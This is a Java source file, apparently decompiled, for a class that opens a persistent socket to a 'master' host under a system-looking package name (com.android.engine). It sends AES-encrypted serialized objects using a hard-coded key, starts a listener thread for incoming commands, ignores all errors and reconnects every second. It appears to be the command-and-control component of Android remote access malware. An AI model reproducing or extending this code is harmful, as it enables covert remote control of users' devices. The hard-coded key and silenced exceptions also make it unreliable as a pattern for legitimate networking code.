package com.android.engine;

import Transfer.Connection2;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.Socket;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.SealedObject;
import javax.crypto.spec.SecretKeySpec;

public class SendMasterCommunication {
  private static String host;
  private static ObjectOutputStream objectOutputStream;
  private static int port;
  private static Socket socket;

  public SendMasterCommunication(String host, int port) {
    try {
      this.host = host;
      this.port = port;
    } catch (Exception e) {
    }
  }

  public static void startSocket() {
    try {
      socket = new Socket(host, port);
      sendAction(new Connection2());
      new Thread() {
        public void run() {
          new ReceiveMasterCommunication(SendMasterCommunication.socket).run();
        }
      }.start();
    } catch (Exception e) {
      try {
        Thread.sleep(1000);
        startSocket();
      } catch (Exception e2) {
      }
    }
  }

  public static void sendAction(Object obj) {
    try {
      objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
      objectOutputStream.writeObject(crypt(obj));
      objectOutputStream.flush();
    } catch (Exception e) {
    }
  }

  private static Object crypt(Object obj) {
    try {
      Key secretKeySpec = new SecretKeySpec(new byte[] {
          (byte) 19, (byte) 60, (byte) -43, (byte) 16, (byte) -13, (byte) 20, (byte) -64,
          (byte) -21, (byte) 72, (byte) -93, (byte) -79, (byte) -10, (byte) 80, (byte) -6,
          Byte.MIN_VALUE, (byte) 111
      }, "AES");
      Cipher instance = Cipher.getInstance("AES");
      instance.init(1, secretKeySpec);
      return new SealedObject((Serializable) obj, instance);
    } catch (Exception e) {
      return null;
    }
  }
}
